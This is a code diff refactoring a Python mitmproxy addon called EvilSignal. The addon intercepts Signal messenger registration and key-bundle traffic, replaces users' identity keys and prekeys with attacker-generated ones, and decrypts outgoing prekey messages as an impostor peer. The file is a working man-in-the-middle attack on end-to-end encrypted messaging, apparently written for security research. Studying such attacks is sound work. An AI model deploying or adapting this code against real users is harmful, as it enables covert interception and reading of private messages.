@@ -1,9 +1,7 @@
 from copy import deepcopy
-
 from mitmproxy.addonmanager import Loader
 from mitmproxy.http import HTTPFlow, Request, Response, Headers
 from mitmproxy.net.http.status_codes import RESPONSES
-# from mitmproxy import ctx
 from dataclasses import dataclass
 from typing import Optional
 import logging
@@ -13,36 +11,39 @@ import logging
 
 from xepor import InterceptedAPI, RouteType, HTTPVerb, Router
 import json
-from signal_protocol import identity_key, curve, session_cipher, address, storage, state, helpers, address
+from signal_protocol import state, helpers
+from signal_protocol.address import ProtocolAddress, DeviceId
+from signal_protocol.identity_key import IdentityKeyPair, IdentityKey
+from signal_protocol.curve import PublicKey
+from signal_protocol import kem, protocol
 from base64 import b64decode, b64encode
 
 import utils
-from database import *
+from database import User, Device, LegitBundle, MitMBundle
 from enum import Enum
-from utils import *
-import re
-from parse import Parser
+import parse
 
-from protos.gen.wire_pb2 import *
-from protos.gen.SignalService_pb2 import *
-from protos.gen.storage_pb2 import *
-from protos.gen.WebSocketResources_pb2 import *
-from protos.gen.SignalService_pb2 import *
-from protos.gen.sealed_sender_pb2 import *
-from protos.gen import *
+# from protos.gen.wire_pb2 import *
+# from protos.gen.SignalService_pb2 import *
+# from protos.gen.storage_pb2 import *
+from protos.gen.WebSocketResources_pb2 import WebSocketMessage, WebSocketRequestMessage, WebSocketResponseMessage
+# from protos.gen.SignalService_pb2 import *
+# from protos.gen.sealed_sender_pb2 import *
+# from protos.gen import *
 
 # from server_proto import *
 from server_proto import addons, HOST_HTTPBIN
-from mitm_interface import *
+# from mitm_interface import *
+from mitm_interface import MitmUser
 from collections import defaultdict
-from mitmproxy import ctx
 
 # logging.getLogger().addHandler(utils.ColorHandler())
 # todo -- fix logging precendence -- https://stackoverflow.com/a/20280587
 logging.getLogger('passlib').setLevel(logging.ERROR)  # suppressing an issue coming from xepor -> passlib
-logging.getLogger('parse').setLevel(logging.ERROR)  # don't cares
+logging.getLogger('parse').setLevel(logging.ERROR)  # don't care
 logging.getLogger('peewee').setLevel(logging.WARN)  # peewee emits full SQL queries otherwise which is not great
 logging.getLogger('xepor.xepor').setLevel(logging.INFO)
+logging.getLogger('mitmproxy.proxy.server').setLevel(logging.WARN)  # too noisy
 
 
 class CiphertextMessageType(Enum):
@@ -106,26 +107,26 @@ class RegistrationInfo():
     pni: Optional[str] = None
     unidentifiedAccessKey: Optional[str] = None
 
-    aciData: KeyData = None
-    pniData: KeyData = None
+    aciData: Optional[KeyData] = None
+    pniData: Optional[KeyData] = None
 
-    serialized_registration_req : Optional[dict] = None
+    serialized_registration_req: Optional[dict] = None
+
 
 @dataclass
 class BobIdenKey():
     uuid: str
-    identityKey: Optional[identity_key.IdentityKeyPair] = None
-    fake_identityKey: Optional[identity_key.IdentityKeyPair] = None
+    identityKey: Optional[IdentityKeyPair] = None
+    fake_identityKey: Optional[IdentityKeyPair] = None
 
 
 registration_info: dict[str, RegistrationInfo] = None
 conversation_session = dict()
 bobs_bundle = dict()
-# f = open('registration_info.json', 'wb')
-# f.write(b"{}")
-# f.close()
+REGISTRATION_INFO_PATH = "registration_info.json"
 
 api = addons[0]
+
 
 class EvilSignal(InterceptedAPI):
     wrapped_api = None
@@ -133,12 +134,12 @@ class EvilSignal(InterceptedAPI):
     def __init__(self, wrapped_api: InterceptedAPI):
         self.wrapped_api = wrapped_api
         super().__init__(
-            default_host = wrapped_api.default_host,
-            host_mapping = wrapped_api.host_mapping,
-            blacklist_domain = wrapped_api.blacklist_domain,
-            request_passthrough = wrapped_api.request_passthrough,
-            response_passthrough = wrapped_api.response_passthrough,
-            respect_proxy_headers = wrapped_api.respect_proxy_headers,
+            default_host=wrapped_api.default_host,
+            host_mapping=wrapped_api.host_mapping,
+            blacklist_domain=wrapped_api.blacklist_domain,
+            request_passthrough=wrapped_api.request_passthrough,
+            response_passthrough=wrapped_api.response_passthrough,
+            respect_proxy_headers=wrapped_api.respect_proxy_headers,
         )
         if self.wrapped_api is not None:
             for route in self.wrapped_api.request_routes.routes:
@@ -154,7 +155,6 @@ class EvilSignal(InterceptedAPI):
                 host, path, mtype, handler = route
                 self.ws_response_routes.add_route(host, path, mtype, handler)
 
-
     def load(self, loader: Loader):
         loader.add_option(
             name="conversation_session",
@@ -162,28 +162,16 @@ class EvilSignal(InterceptedAPI):
             default=dict(),
             help="chat sessions",
         )
-        # a bit hacky
-        # if self.wrapped_api is not None:
-        #     for route in self.wrapped_api.request_routes.routes:
-        #         host, path, method, handler, allowed_statuses = route
-        #         self.request_routes.add_route(host, path, method, handler, allowed_statuses)
-        #     for route in self.wrapped_api.response_routes.routes:
-        #         host, path, method, handler, allowed_statuses = route
-        #         self.response_routes.add_route(host, path, method, handler, allowed_statuses)
-        #     for route in self.wrapped_api.ws_request_routes.routes:
-        #         host, path, mtype, handler = route
-        #         self.ws_request_routes.add_route(host, path, mtype, handler)
-        #     for route in self.wrapped_api.ws_response_routes.routes:
-        #         host, path, mtype, handler = route
-        #         self.ws_response_routes.add_route(host, path, mtype, handler)
 
-        super().load(loader) # pass remaining to
+        super().load(loader)  # pass remaining to
+
 
 api = EvilSignal(api)
 
-def json_to_reginfo(json_registations: str) -> dict[str, RegistrationInfo]:
-    loaded_dict = json.loads(json_registations)
-    return {key: json_to_dataclass(RegistrationInfo, value) for key, value in loaded_dict.items()}
+
+def json_to_registrations(json_registrations: str) -> dict[str, RegistrationInfo]:
+    loaded_dict = json.loads(json_registrations)
+    return {key: utils.json_to_dataclass(RegistrationInfo, value) for key, value in loaded_dict.items()}
 
 
 @api.route("/v1/registration", rtype=RouteType.REQUEST)
@@ -192,11 +180,11 @@ def _v1_registration(flow: HTTPFlow):
 
     req = json.loads(flow.request.content)
     global registration_info
-    with open("registration_info.json", "r") as f:
-        registration_info = json_to_reginfo(f.read())
+    with open(REGISTRATION_INFO_PATH, "r") as f:
+        registration_info = json_to_registrations(f.read())
     # todo: is this the first time?
-    
-    already_saved = registration_info.get(flow.client_conn.address[0])
+
+    already_saved = registration_info.get(flow.client_conn.peername[0])
     if already_saved:
         logging.warning("Already saved. Serving the same bundle")
         flow.request.content = json.dumps(already_saved.serialized_registration_req).encode()
@@ -213,24 +201,30 @@ def _v1_registration(flow: HTTPFlow):
     aci_pq_lastResortKey = deepcopy(req['aciPqLastResortPreKey'])
     pni_pq_lastResortKey = deepcopy(req['pniPqLastResortPreKey'])
 
-    aci_fake_IdenKey = identity_key.IdentityKeyPair.generate()
-    pni_fake_IdenKey = identity_key.IdentityKeyPair.generate()
+    aci_fake_IdenKey = IdentityKeyPair.generate()
+    pni_fake_IdenKey = IdentityKeyPair.generate()
 
     fake_signed_pre_keys, fake_secret_SignedPreKeys = helpers.create_registration(aci_fake_IdenKey, pni_fake_IdenKey,
                                                                                   aci_spk_id=aci_SignedPreKey['keyId'],
                                                                                   pni_spk_id=pni_SignedPreKey['keyId'],
-                                                                                  aci_kyber_id=aci_pq_lastResortKey['keyId'],
-                                                                                  pni_kyber_id=pni_pq_lastResortKey['keyId'])
+                                                                                  aci_kyber_id=aci_pq_lastResortKey[
+                                                                                      'keyId'],
+                                                                                  pni_kyber_id=pni_pq_lastResortKey[
+                                                                                      'keyId'])
 
     # todo: assert id's are the same ^^
-    assert fake_signed_pre_keys['aciSignedPreKey']['keyId'] == req['aciSignedPreKey']['keyId'], "registration: keyId mismatch for aciSignedPreKey"
-    assert fake_signed_pre_keys['pniSignedPreKey']['keyId'] == req['pniSignedPreKey']['keyId'], "registration: keyId mismatch for pniSignedPreKey"
-    assert fake_signed_pre_keys['aciPqLastResortPreKey']['keyId'] == req['aciPqLastResortPreKey']['keyId'], "registration: keyId mismatch for aciPqLastResortPreKey"
-    assert fake_signed_pre_keys['pniPqLastResortPreKey']['keyId'] == req['pniPqLastResortPreKey']['keyId'], "registration: keyId mismatch for pniPqLastResortPreKey"
+    assert fake_signed_pre_keys['aciSignedPreKey']['keyId'] == req['aciSignedPreKey'][
+        'keyId'], "registration: keyId mismatch for aciSignedPreKey"
+    assert fake_signed_pre_keys['pniSignedPreKey']['keyId'] == req['pniSignedPreKey'][
+        'keyId'], "registration: keyId mismatch for pniSignedPreKey"
+    assert fake_signed_pre_keys['aciPqLastResortPreKey']['keyId'] == req['aciPqLastResortPreKey'][
+        'keyId'], "registration: keyId mismatch for aciPqLastResortPreKey"
+    assert fake_signed_pre_keys['pniPqLastResortPreKey']['keyId'] == req['pniPqLastResortPreKey'][
+        'keyId'], "registration: keyId mismatch for pniPqLastResortPreKey"
 
     req.update(fake_signed_pre_keys)
 
-    registration_info[flow.client_conn.address[0]] = RegistrationInfo(
+    registration_info[flow.client_conn.peername[0]] = RegistrationInfo(
         unidentifiedAccessKey=unidentifiedAccessKey,
         aciData=KeyData(
             IdenKey=aci_IdenKey,
@@ -262,8 +256,8 @@ def _v1_registration(flow: HTTPFlow):
         )
     )
 
-    with open("registration_info.json", "w") as f:
-        data = json.dumps(registration_info, default=dataclass_to_json)
+    with open(REGISTRATION_INFO_PATH, "w") as f:
+        data = json.dumps(registration_info, default=utils.dataclass_to_json)
         f.write(data)
 
     flow.request.content = json.dumps(req).encode()
@@ -290,7 +284,9 @@ def _v1_verif_error(flow: HTTPFlow, sessionId: str):
     status = flow.response.status_code
     if status < 300:
         return
-    logging.warning(f"Registration for session {sessionId} will likely fail due to verification error, got {status}: {RESPONSES[status]}")
+    logging.warning(
+        f"Registration for session {sessionId} will likely fail due to verification error, got {status}: {RESPONSES[status]}")
+
 
 @api.route("/v1/registration", rtype=RouteType.RESPONSE)
 def _v1_registration(flow: HTTPFlow):
@@ -311,10 +307,10 @@ def _v1_registration(flow: HTTPFlow):
 
     resp = json.loads(flow.response.content)
     # logging.info(f"RESPONSE: {resp}")
-    ip_address = flow.client_conn.address[0]
+    ip_address = flow.client_conn.peername[0]
 
-    with open("registration_info.json", "r") as f:
-        registration_info = json_to_reginfo(f.read())
+    with open(REGISTRATION_INFO_PATH, "r") as f:
+        registration_info = json_to_registrations(f.read())
 
     user = User.insert(
         pNumber=resp["number"],
@@ -338,8 +334,8 @@ def _v1_registration(flow: HTTPFlow):
     registration_info[ip_address].aci = resp["uuid"]
     registration_info[ip_address].pni = resp["pni"]
 
-    with open("registration_info.json", "w") as f:
-        f.write(json.dumps(registration_info, default=dataclass_to_json))
+    with open(REGISTRATION_INFO_PATH, "w") as f:
+        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))
 
 
 @api.route("/v2/keys", rtype=RouteType.REQUEST, method=HTTPVerb.PUT)
@@ -347,11 +343,11 @@ def _v2_keys(flow: HTTPFlow):
     identity = flow.request.query["identity"]
 
     req = json.loads(flow.request.content)
-    address = flow.client_conn.address[0]
+    address = flow.client_conn.peername[0]
 
     global registration_info
-    with open("registration_info.json", "r") as f:
-        registration_info = json_to_reginfo(f.read())
+    with open(REGISTRATION_INFO_PATH, "r") as f:
+        registration_info = json_to_registrations(f.read())
 
     ## TODO: instead of naming each key for both variables, just use the identifier as a key and the bundle(dict) as the value
     if not registration_info.get(address):
@@ -370,8 +366,8 @@ def _v2_keys(flow: HTTPFlow):
         logging.exception(f"{flow} AND {registration_info}")
         return
 
-    pq_pre_keys = req["pqPreKeys"]
-    pre_keys = req["preKeys"]
+    pq_pre_keys = deepcopy(req["pqPreKeys"])
+    pre_keys = deepcopy(req["preKeys"])
 
     key_data.pq_PreKeys = pq_pre_keys
     key_data.PreKeys = pre_keys
@@ -403,7 +399,7 @@ def _v2_keys(flow: HTTPFlow):
         "privateKey": b64encode(alice_identity_key_pair.private_key().serialize()).decode("utf-8")
     }
     fake_spk = key_data.fake_SignedPreKeys
-    fake_spk["privateKey"] = key_data.fake_secret_SignedPreKeys
+    fake_spk["privateKey"] = deepcopy(key_data.fake_secret_SignedPreKeys)
     prekeys = utils.json_join_public(key_data.fake_PreKeys, key_data.fake_secret_PreKeys)
     fake_kyber = utils.json_join_public(key_data.fake_pq_PreKeys, key_data.fake_secret_pq_PreKeys)
     fake_last_resort = {
@@ -432,6 +428,8 @@ def _v2_keys(flow: HTTPFlow):
     with open("registration_info.json", "w") as f:
         f.write(json.dumps(registration_info, default=dataclass_to_json))
 
+    with open(REGISTRATION_INFO_PATH, "w") as f:
+        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))
 
     flow.request.content = json.dumps(req).encode()
 
@@ -442,21 +440,21 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     # logging.exception((flow.response.content, identifier, device_id))
     global registration_info
 
-    with open("registration_info.json", "r") as f:
-        registration_info = json_to_reginfo(f.read())
+    with open(REGISTRATION_INFO_PATH, "r") as f:
+        registration_info = json_to_registrations(f.read())
 
     resp = json.loads(flow.response.content)
     ip_address = flow.client_conn.address[0]
 
-    #logging.info(f"RESPONSE: {json.dumps(resp, indent=4)}")
-    identity, uuid = strip_uuid_and_id(identifier)
+    # logging.info(f"RESPONSE: {json.dumps(resp, indent=4)}")
+    identity, uuid = utils.strip_uuid_and_id(identifier)
 
     bob_identity_key_public = b64decode(resp["identityKey"])
 
     ############ MitmToBob setup (fake Alice)
     for id, bundle in enumerate(resp["devices"]):
         # data should be uuid of Alice and the device id (in this case 1 is ok)
-        fakeVictim = MitmUser(address.ProtocolAddress("fake_alice", 1))
+        fakeVictim = MitmUser(ProtocolAddress("fake_alice", 1))
 
         bob_registartion_id = bundle["registrationId"]
 
@@ -474,7 +472,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
         bob_bundle = state.PreKeyBundle(
             bob_registartion_id,
-            address.DeviceId(device_id),
+            DeviceId(device_id),
             (state.PreKeyId(bundle["preKey"]["keyId"]), PublicKey.deserialize(bob_pre_key_public)),
             state.SignedPreKeyId(1),
             PublicKey.deserialize(bob_signed_pre_key_public),
@@ -491,7 +489,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
             logging.error(f"Device ID is not greater than 0: {bob_bundle.device_id().get_id()}")
 
         logging.warning(registration_info.keys())
-        #logging.warning(flow, ip_address)
+        # logging.warning(flow, ip_address)
         lastResortPq = registration_info[ip_address].aciData if identifier == "aci" else registration_info[
             ip_address].pniData
 
@@ -508,7 +506,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
             lastResortKyber=lastResortPq.pq_lastResortKey  # need to get from registration_info
         )
         legit_bundle.on_conflict_replace().execute()
-        fakeVictim.process_pre_key_bundle(address.ProtocolAddress(uuid, device_id), bob_bundle)
+        fakeVictim.process_pre_key_bundle(ProtocolAddress(uuid, device_id), bob_bundle)
 
     ############ Swap the prekeybundle TODO 
 
@@ -519,11 +517,16 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
 
         if not identity_key:
             # todo create row
-            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, bob_device_id), RID = bundle["registrationId"], pre_key_id= bundle["preKey"]["keyId"], signed_pre_key_id=bundle["signedPreKey"]["keyId"], kyber_pre_key_id=bundle["pqPreKey"]["keyId"])
+            fakeUser = MitmUser(address=ProtocolAddress(uuid, bob_device_id), RID=bundle["registrationId"],
+                                pre_key_id=bundle["preKey"]["keyId"], signed_pre_key_id=bundle["signedPreKey"]["keyId"],
+                                kyber_pre_key_id=bundle["pqPreKey"]["keyId"])
             identity_key = fakeUser.identity_key_pair
 
         else:
-            fakeUser = MitmUser(address=address.ProtocolAddress(uuid, bob_device_id), RID = bundle["registrationId"], pre_key_id= bundle["preKey"]["keyId"], signed_pre_key_id=bundle["signedPreKey"]["keyId"], kyber_pre_key_id=bundle["pqPreKey"]["keyId"], identity_key=identity_key.fake_identityKey)
+            fakeUser = MitmUser(address=ProtocolAddress(uuid, bob_device_id), RID=bundle["registrationId"],
+                                pre_key_id=bundle["preKey"]["keyId"], signed_pre_key_id=bundle["signedPreKey"]["keyId"],
+                                kyber_pre_key_id=bundle["pqPreKey"]["keyId"],
+                                identity_key=identity_key.fake_identityKey)
             identity_key = identity_key.fake_identityKey
 
         fakeBundle = fakeUser.pre_key_bundle.to_dict()
@@ -602,7 +605,7 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     resp.update(fakeBundle_wire)
 
     # ctx.options.conversation_session[] = (fakeVictim, fakeUser)
-    #ctx.options.conversation_session = dict(ctx.options.conversation_session, **{f"{ip_address}:{uuid}": (fakeVictim, fakeUser)})
+    # ctx.options.conversation_session = dict(ctx.options.conversation_session, **{f"{ip_address}:{uuid}": (fakeVictim, fakeUser)})
     # logging.warning(f"session {ctx.options.conversation_session}")
     conversation_session[f"{ip_address}:{uuid}"] = (fakeVictim, fakeUser)
     # logging.warning(f"session {conversation_session}")
@@ -611,8 +614,8 @@ def v2_keys_identifier_device_id(flow, identifier: str, device_id: str):
     assert "privateKey" not in resp['devices'][0]['signedPreKey']
     assert "privateKey" not in resp['devices'][0]['pqPreKey']
 
-    with open("registration_info.json", "w") as f:
-        f.write(json.dumps(registration_info, default=dataclass_to_json))
+    with open(REGISTRATION_INFO_PATH, "w") as f:
+        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))
     flow.response.content = json.dumps(resp, sort_keys=True).encode()
 
 
@@ -620,8 +623,8 @@ def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
     logging.info(f"my profile: {identifier} {version} {credentialRequest}")
 
     global registration_info
-    with open("registration_info.json", "r") as f:
-        registration_info = json_to_reginfo(f.read())
+    with open(REGISTRATION_INFO_PATH, "r") as f:
+        registration_info = json_to_registrations(f.read())
 
     resp = json.loads(flow.response.content)
     ip_address = flow.client_conn.address[0]
@@ -634,9 +637,8 @@ def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
     resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
     flow.response.content = json.dumps(resp).encode()
 
-    with open("registration_info.json", "w") as f:
-        f.write(json.dumps(registration_info, default=dataclass_to_json))
-
+    with open(REGISTRATION_INFO_PATH, "w") as f:
+        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))
 
     return flow.response.content
     # raise RuntimeError(f"my profile: {identifier} {version} {credentialRequest}")
@@ -644,8 +646,8 @@ def _v1_ws_my_profile(flow, identifier, version, credentialRequest):
 
 def _v1_ws_profile_futut(flow, identifier, version):
     global registration_info
-    with open("registration_info.json", "r") as f:
-        registration_info = json_to_reginfo(f.read())
+    with open(REGISTRATION_INFO_PATH, "r") as f:
+        registration_info = json_to_registrations(f.read())
 
     logging.info(f"my profile 2: {identifier} {version}")
     # raise RuntimeError(f"my profile: {identifier} {version}")
@@ -660,9 +662,9 @@ def _v1_ws_profile_futut(flow, identifier, version):
 
     resp["identityKey"] = registration_info[ip_address].aciData.IdenKey
     flow.response.content = json.dumps(resp).encode()
-    
-    with open("registration_info.json", "w") as f:
-        f.write(json.dumps(registration_info, default=dataclass_to_json))
+
+    with open(REGISTRATION_INFO_PATH, "w") as f:
+        f.write(json.dumps(registration_info, default=utils.dataclass_to_json))
 
     return flow.response.content
 
@@ -671,7 +673,7 @@ def _v1_ws_profile(flow, identifier):
     # message = flow.websocket.messages[-1]
     logging.info(f"{identifier}")
     try:
-        uuid_type, uuid = strip_uuid_and_id(identifier)
+        uuid_type, uuid = utils.strip_uuid_and_id(identifier)
     except:
         logging.exception(f"Invalid identifier {identifier}")
         return
@@ -686,7 +688,7 @@ def _v1_ws_profile(flow, identifier):
     if bundle:
         public_fake_IdenKey = bundle.FakeIdenKey['publicKey']
     else:
-        fake_IdenKey = identity_key.IdentityKeyPair.generate()
+        fake_IdenKey = IdentityKeyPair.generate()
         bobs_bundle[uuid] = BobIdenKey(uuid, idenKey, fake_IdenKey)
         public_fake_IdenKey = b64encode(bobs_bundle[uuid].fake_identityKey.public_key().serialize()).decode("utf-8")
 
@@ -694,9 +696,8 @@ def _v1_ws_profile(flow, identifier):
     content["identityKey"] = public_fake_IdenKey
 
     logging.info(f"content: {content}")  #### TODO: what's happening here? No injection of fake identity key
-
     # TODO: right now we are altering a "pseudo-flow" -- one we created artificially from a websocket message.
-    # ideally, we will propage this further by checking if the flow was altered by the handler auto-magically.
+    # ideally, we will propagate this further by checking if the flow was altered by the handler auto-magically.
     flow.response.content = json.dumps(content).encode()
     return flow.response.content
 
@@ -712,7 +713,7 @@ def _v1_ws_message(flow, identifier):
 
     destination_user = req["destination"]
 
-    identifier, destination = strip_uuid_and_id(destination_user)
+    identifier, destination = utils.strip_uuid_and_id(destination_user)
 
     logging.warning(conversation_session)
 
@@ -721,7 +722,7 @@ def _v1_ws_message(flow, identifier):
     if session:
         fakeVictim, fakeUser = session
     else:
-        #logging.error(f"Session not found for {ip_address} and {destination}")
+        # logging.error(f"Session not found for {ip_address} and {destination}")
         return
 
     logging.warning(f"SESSION: {session}")
@@ -742,9 +743,9 @@ def _v1_ws_message(flow, identifier):
         msg_type = OutgoingMessageType(int(msg["type"]))
         if msg_type == OutgoingMessageType.PREKEY_BUNDLE:
             pksm = protocol.PreKeySignalMessage.try_from(content)
-            logging.warning(f"{pksm}")
+            # logging.warning(f"PKSM> kyber: {pksm.message()}")
             try:
-                fakeUser.decrypt(address.ProtocolAddress(destination, msg["destinationDeviceId"]), pksm)
+                fakeUser.decrypt(ProtocolAddress(destination, msg["destinationDeviceId"]), pksm)
             except Exception as e:
                 logging.warning(f"DECRYPTION FAILED: {e}\n\t{pksm}")
 
@@ -782,15 +783,15 @@ def decap_ws_msg(orig_flow: HTTPFlow, msg, rtype=RouteType.REQUEST):
 
 ws_resp = Router()
 
-ws_resp.add_route(HOST_HTTPBIN, Parser("/v1/profile/{identifier}/{version}/{credentialRequest}"), HTTPVerb.ANY,
+ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}/{credentialRequest}"), HTTPVerb.ANY,
                   _v1_ws_my_profile, None)
-ws_resp.add_route(HOST_HTTPBIN, Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY, _v1_ws_profile_futut, None)
-ws_resp.add_route(HOST_HTTPBIN, Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile, None)
-ws_resp.add_route(HOST_HTTPBIN, Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)
+ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}/{version}"), HTTPVerb.ANY, _v1_ws_profile_futut, None)
+ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/profile/{identifier}"), HTTPVerb.ANY, _v1_ws_profile, None)
+ws_resp.add_route(HOST_HTTPBIN, parse.Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)
 
 ws_req = Router()
-ws_req.add_route(HOST_HTTPBIN, Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v1_ws_message, None)
-ws_req.add_route(HOST_HTTPBIN, Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)
+ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/messages/{identifier}"), HTTPVerb.ANY, _v1_ws_message, None)
+ws_req.add_route(HOST_HTTPBIN, parse.Parser("/v1/keepalive"), HTTPVerb.ANY, lambda x: None, None)
 
 
 @api.ws_route("/v1/websocket/", rtype=RouteType.REQUEST)
@@ -801,7 +802,6 @@ def _v1_websocket_req(flow: HTTPFlow, msg):
     logging.info(f"WEBSOCKET REQUEST: {ws_msg}")
     msg.injected = True
 
-
     id = ws_msg.id
     if websocket_open_state.get(id):
         logging.warning(f"Message request already exists for id {id}")
@@ -811,8 +811,8 @@ def _v1_websocket_req(flow: HTTPFlow, msg):
     path = websocket_open_state[id].request.path
 
     host = flow.request.pretty_host if flow.live else HOST_HTTPBIN
-    if not "signal" in host:
-        host = HOST_HTTPBIN # this shouldn't be needed but just to be safe ^^
+    if "signal" not in host:
+        host = HOST_HTTPBIN  # this shouldn't be needed but just to be safe ^^
 
     f = decap_ws_msg(flow, msg)
     handler, params, _ = ws_req.find_handler(host, path)
@@ -839,7 +839,6 @@ def _v1_websocket_resp(flow: HTTPFlow, msg):
     logging.info(f"WEBSOCKET RESPONSE: {ws_msg}")
     msg.injected = True
 
-
     id = ws_msg.id
 
     if not websocket_open_state.get(id):
@@ -852,8 +851,8 @@ def _v1_websocket_resp(flow: HTTPFlow, msg):
     logging.warning(f"Websocket resp with id {id} and path {path}")
 
     host = flow.request.pretty_host if flow.live else HOST_HTTPBIN
-    if not "signal" in host:
-        host = HOST_HTTPBIN # this shouldn't be needed but just to be safe ^^
+    if "signal" not in host:
+        host = HOST_HTTPBIN  # this shouldn't be needed but just to be safe ^^
 
     f = decap_ws_msg(flow, msg, RouteType.RESPONSE)
     handler, params, _ = ws_resp.find_handler(host, path)
@@ -877,28 +876,27 @@ addons = [api]
 from mitmproxy.tools.main import mitmdump
 
 if __name__ == "__main__":
-  import time
-  import config
+    import time
+    import config
 
-  flow_name = f"debug_{int(time.time())}.flow"
-  f = open("registration_info.json", "wb")
-  f.write(b"{}")
-  f.close()
+    flow_name = f"debug_{int(time.time())}.flow"
+    f = open(REGISTRATION_INFO_PATH, "wb")
+    f.write(b"{}")
+    f.close()
 
-  mitmdump(
-    [
-      # "-q",   # quiet flag, only script's output
-      "--mode",
-      "transparent",
-      "--showhost",
-      "--ssl-insecure",
-      "--ignore-hosts",
-      config.IGNORE_HOSTS,
-      "-s",   # script flag
-      __file__,# use the same file as the hook
-      # "-r",
-      # "mitmproxy_flows/PQ_registration"
-      "-w",
-      flow_name
-    ]
-  )
+    params = [
+            # "-q",   # quiet flag, only script's output
+            "--mode",
+            "transparent",
+            "--showhost",
+            "--ssl-insecure",
+            "--ignore-hosts",
+            config.IGNORE_HOSTS,
+            "-s",  # script flag
+            __file__,  # use the same file as the hook
+            # "-r",
+            # "mitmproxy_flows/PQ_registration"
+            "-w",
+            flow_name
+        ]
+    mitmdump(params)
